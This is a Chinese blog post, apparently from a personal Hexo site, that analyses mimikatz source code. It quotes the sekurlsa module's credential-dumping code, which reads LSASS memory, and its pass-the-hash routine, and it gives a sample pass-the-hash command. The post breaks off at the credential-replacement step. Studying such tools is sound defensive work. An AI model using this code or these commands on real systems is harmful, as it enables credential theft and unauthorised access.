@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sekurlsasekurlsa模块的主要命令和功能在kuhl_m_c_sekurlsa中定义 1234567891011121314151617181920212223242526272829const KUHL_M_C kuhl_m_c_sekurlsa[] = &amp;#123;	&amp;#123;kuhl_m_sekurlsa_msv,				L&quot;msv&quot;,				L&quot;Lists LM &amp;amp; N">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mimikatz源码分析">
+<meta property="og:url" content="http://sup817ch.github.io/2020/12/28/mimikatz源码分析/index.html">
+<meta property="og:site_name" content="sup817ch&#39;s blog">
+<meta property="og:description" content="sekurlsasekurlsa模块的主要命令和功能在kuhl_m_c_sekurlsa中定义 1234567891011121314151617181920212223242526272829const KUHL_M_C kuhl_m_c_sekurlsa[] = &amp;#123;	&amp;#123;kuhl_m_sekurlsa_msv,				L&quot;msv&quot;,				L&quot;Lists LM &amp;amp; N">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-12-28T11:06:01.445Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mimikatz源码分析">
+<meta name="twitter:description" content="sekurlsasekurlsa模块的主要命令和功能在kuhl_m_c_sekurlsa中定义 1234567891011121314151617181920212223242526272829const KUHL_M_C kuhl_m_c_sekurlsa[] = &amp;#123;	&amp;#123;kuhl_m_sekurlsa_msv,				L&quot;msv&quot;,				L&quot;Lists LM &amp;amp; N">
+
+
+
+
+
+
+  <link rel="canonical" href="http://sup817ch.github.io/2020/12/28/mimikatz源码分析/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>mimikatz源码分析 | sup817ch's blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sup817ch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sup817ch.github.io/2020/12/28/mimikatz源码分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sup817ch">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sup817ch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">mimikatz源码分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-12-28 09:58:57 / 修改时间：19:06:01" itemprop="dateCreated datePublished" datetime="2020-12-28T09:58:57+08:00">2020-12-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sekurlsa"><a href="#sekurlsa" class="headerlink" title="sekurlsa"></a>sekurlsa</h1><p>sekurlsa模块的主要命令和功能在kuhl_m_c_sekurlsa中定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> KUHL_M_C kuhl_m_c_sekurlsa[] = &#123;</span><br><span class="line">	&#123;kuhl_m_sekurlsa_msv,				<span class="string">L"msv"</span>,				<span class="string">L"Lists LM &amp; NTLM credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_wdigest,			<span class="string">L"wdigest"</span>,			<span class="string">L"Lists WDigest credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_kerberos,			<span class="string">L"kerberos"</span>,		<span class="string">L"Lists Kerberos credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_tspkg,				<span class="string">L"tspkg"</span>,			<span class="string">L"Lists TsPkg credentials"</span>&#125;,</span><br><span class="line">#<span class="keyword">if</span> !defined(_M_ARM64)</span><br><span class="line">	&#123;kuhl_m_sekurlsa_livessp,			<span class="string">L"livessp"</span>,			<span class="string">L"Lists LiveSSP credentials"</span>&#125;,</span><br><span class="line">#endif</span><br><span class="line">	&#123;kuhl_m_sekurlsa_cloudap,			<span class="string">L"cloudap"</span>,			<span class="string">L"Lists CloudAp credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_ssp,				<span class="string">L"ssp"</span>,				<span class="string">L"Lists SSP credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_all,				<span class="string">L"logonPasswords"</span>,	<span class="string">L"Lists all available providers credentials"</span>&#125;,</span><br><span class="line"></span><br><span class="line">	&#123;kuhl_m_sekurlsa_process,			<span class="string">L"process"</span>,			<span class="string">L"Switch (or reinit) to LSASS process  context"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_minidump,			<span class="string">L"minidump"</span>,		<span class="string">L"Switch (or reinit) to LSASS minidump context"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_sk_bootKey,		<span class="string">L"bootkey"</span>,			<span class="string">L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_pth,				<span class="string">L"pth"</span>,				<span class="string">L"Pass-the-hash"</span>&#125;,</span><br><span class="line">#<span class="keyword">if</span> !defined(_M_ARM64)</span><br><span class="line">	&#123;kuhl_m_sekurlsa_krbtgt,			<span class="string">L"krbtgt"</span>,			<span class="string">L"krbtgt!"</span>&#125;,</span><br><span class="line">#endif</span><br><span class="line">	&#123;kuhl_m_sekurlsa_dpapi_system,		<span class="string">L"dpapisystem"</span>,		<span class="string">L"DPAPI_SYSTEM secret"</span>&#125;,</span><br><span class="line">#<span class="keyword">if</span> defined(_M_X64) || defined(_M_ARM64) <span class="comment">// <span class="doctag">TODO:</span>ARM64</span></span><br><span class="line">	&#123;kuhl_m_sekurlsa_trust,				<span class="string">L"trust"</span>,			<span class="string">L"Antisocial"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_bkeys,				<span class="string">L"backupkeys"</span>,		<span class="string">L"Preferred Backup Master keys"</span>&#125;,</span><br><span class="line">#endif</span><br><span class="line">	&#123;kuhl_m_sekurlsa_kerberos_tickets,	<span class="string">L"tickets"</span>,			<span class="string">L"List Kerberos tickets"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_kerberos_keys,		<span class="string">L"ekeys"</span>,			<span class="string">L"List Kerberos Encryption Keys"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_dpapi,				<span class="string">L"dpapi"</span>,			<span class="string">L"List Cached MasterKeys"</span>&#125;,</span><br><span class="line">	&#123;kuhl_m_sekurlsa_credman,			<span class="string">L"credman"</span>,			<span class="string">L"List Credentials Manager"</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="Lists-credentials"><a href="#Lists-credentials" class="headerlink" title="Lists credentials"></a>Lists credentials</h2><p>获取凭据的主要逻辑都在kuhl_m_sekurlsa_enum中的callback，函数原型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">kuhl_m_sekurlsa_enum</span><span class="params">(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)</span></span></span><br></pre></td></tr></table></figure>
+<p>callback对应了各个小功能的逻辑，比如sekurlsa::msv的callback就是kuhl_m_sekurlsa_enum_callback_logondata</p>
+<p>在kuhl_m_sekurlsa_enum中，首先会调用kuhl_m_sekurlsa_acquireLSA去打开lsass进程并初始化一些信息，先看看kuhl_m_sekurlsa_acquireLSA的内部。</p>
+<p>打开lsass的DesiredAccess为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION &lt; <span class="number">6</span>) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);</span><br></pre></td></tr></table></figure>
+<p>之后还会检查lsass中某些模块是否加载</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">kuhl_m_sekurlsa_findlibs</span><span class="params">(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; ARRAYSIZE(lsassPackages); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(_wcsicmp(lsassPackages[i]-&gt;ModuleName, pModuleInformation-&gt;NameDontUseOutsideCallback-&gt;Buffer) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			lsassPackages[i]-&gt;Module.isPresent = TRUE;</span><br><span class="line">			lsassPackages[i]-&gt;Module.Informations = *pModuleInformation;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KUHL_M_SEKURLSA_PACKAGE</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">wchar_t</span> * Name;</span><br><span class="line">	PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;</span><br><span class="line">	BOOL isValid;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">wchar_t</span> * ModuleName;</span><br><span class="line">	KUHL_M_SEKURLSA_LIB Module;</span><br><span class="line">&#125; KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = &#123;</span><br><span class="line">	&amp;kuhl_m_sekurlsa_msv_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_tspkg_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_wdigest_package,</span><br><span class="line">#<span class="keyword">if</span> !defined(_M_ARM64)</span><br><span class="line">	&amp;kuhl_m_sekurlsa_livessp_package,</span><br><span class="line">#endif</span><br><span class="line">	&amp;kuhl_m_sekurlsa_kerberos_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_ssp_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_dpapi_svc_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_credman_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_kdcsvc_package,</span><br><span class="line">	&amp;kuhl_m_sekurlsa_cloudap_package,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = &#123;<span class="string">L"msv"</span>, kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, <span class="string">L"lsasrv.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package = &#123;<span class="string">L"tspkg"</span>, kuhl_m_sekurlsa_enum_logon_callback_tspkg, TRUE, <span class="string">L"tspkg.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package = &#123;<span class="string">L"wdigest"</span>, kuhl_m_sekurlsa_enum_logon_callback_wdigest, TRUE, <span class="string">L"wdigest.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package = &#123;<span class="string">L"livessp"</span>, kuhl_m_sekurlsa_enum_logon_callback_livessp, FALSE, <span class="string">L"livessp.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = &#123;<span class="string">L"kerberos"</span>, kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, <span class="string">L"kerberos.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_package = &#123;<span class="string">L"ssp"</span>, kuhl_m_sekurlsa_enum_logon_callback_ssp, TRUE, <span class="string">L"msv1_0.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = &#123;<span class="string">L"dpapi"</span>, <span class="literal">NULL</span>, FALSE, <span class="string">L"dpapisrv.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = &#123;<span class="string">L"credman"</span>, kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, <span class="string">L"lsasrv.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = &#123;<span class="string">L"kdc"</span>, <span class="literal">NULL</span>, FALSE, <span class="string">L"kdcsvc.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br><span class="line">KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package = &#123;<span class="string">L"cloudap"</span>, kuhl_m_sekurlsa_enum_logon_callback_cloudap, FALSE, <span class="string">L"cloudap.dll"</span>, &#123;&#123;&#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;, FALSE, FALSE&#125;&#125;;</span><br></pre></td></tr></table></figure>
+<p>回到kuhl_m_sekurlsa_enum中，接下来会获取一些sessionData，然后调用callback，进入关键逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper-&gt;offsetToLuid);</span><br><span class="line">sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper-&gt;offsetToLogonType));</span><br><span class="line">sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper-&gt;offsetToSession));</span><br><span class="line">sessionData.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToUsername);</span><br><span class="line">sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToDomain);</span><br><span class="line">sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper-&gt;offsetToCredentials);</span><br><span class="line">sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper-&gt;offsetToPSid);</span><br><span class="line">sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;offsetToCredentialManager);</span><br><span class="line">sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper-&gt;offsetToLogonTime));</span><br><span class="line">sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonServer);</span><br><span class="line"></span><br><span class="line">kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);</span><br><span class="line">kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);</span><br><span class="line">kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);</span><br><span class="line">kull_m_process_getSid(&amp;sessionData.pSid, cLsass.hLsassMem);</span><br><span class="line"></span><br><span class="line">retCallback = callback(&amp;sessionData, pOptionalData);</span><br></pre></td></tr></table></figure>
+<p>总的来说，无论用哪种方式获取凭据，都需要先获取lsass的内存。</p>
+<h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>pth即pass the hash，在mimikatz中使用的例子如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure>
+<p>该功能主要逻辑在kuhl_m_sekurlsa_pth中，该函数原型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">kuhl_m_sekurlsa_pth</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span> * argv[])</span></span></span><br></pre></td></tr></table></figure>
+<p>在该函数中，会用CreateProcessWithLogonW创建一个新的进程，调用如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateProcessWithLogonW(user, domain, password, iLogonFlags, <span class="literal">NULL</span>, dupCommandLine, iProcessFlags, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupInfo, ptrProcessInfos)</span><br></pre></td></tr></table></figure>
+<p>在sekurlsa::pth中lpPassword为空，dwLogonFlags为LOGON_NETCREDENTIALS_ONLY，msdn对该参数的描述如下</p>
+<blockquote>
+<p><strong>LOGON_NETCREDENTIALS_ONLY</strong></p>
+<p>0x00000002</p>
+<p>Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.<br>This value can be used to create a process that uses a different set of credentials locally than it does remotely. This is useful in inter-domain scenarios where there is no trust relationship.</p>
+<p>The system does not validate the specified credentials. Therefore, the process can start, but it may not have access to network resources.</p>
+</blockquote>
+<p>然后调用kuhl_m_sekurlsa_pth_luid进行pth的核心操作，在该函数内部，首先进一步获取对lsass的写权限。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">status = NtQueryObject(cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess, ObjectBasicInformation, &amp;bi, <span class="keyword">sizeof</span>(OBJECT_BASIC_INFORMATION), &amp;szNeeded);</span><br><span class="line"><span class="keyword">if</span>(NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(isRWok = (bi.GrantedAccess &amp; (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))</span><br><span class="line">		kprintf(<span class="string">L"was already R/W\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess)))</span><br><span class="line">		&#123;</span><br><span class="line">			isRWok = TRUE;</span><br><span class="line">			CloseHandle(cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess);</span><br><span class="line">			cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess = hTemp;</span><br><span class="line">			kprintf(<span class="string">L"is now R/W\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> PRINT_ERROR_AUTO(<span class="string">L"OpenProcess"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess, GetCurrentProcess(), &amp;hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	CloseHandle(cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess);</span></span><br><span class="line">		<span class="comment">//	cLsass.hLsassMem-&gt;pHandleProcess-&gt;hProcess = hTemp;</span></span><br><span class="line">		<span class="comment">//	kprintf(L"is now R/W\n");</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="comment">//else PRINT_ERROR_AUTO(L"DuplicateHandle");</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"NtQueryObject: %08x\n"</span>, status);</span><br></pre></td></tr></table></figure>
+<p>接下来进行凭据替换</p>
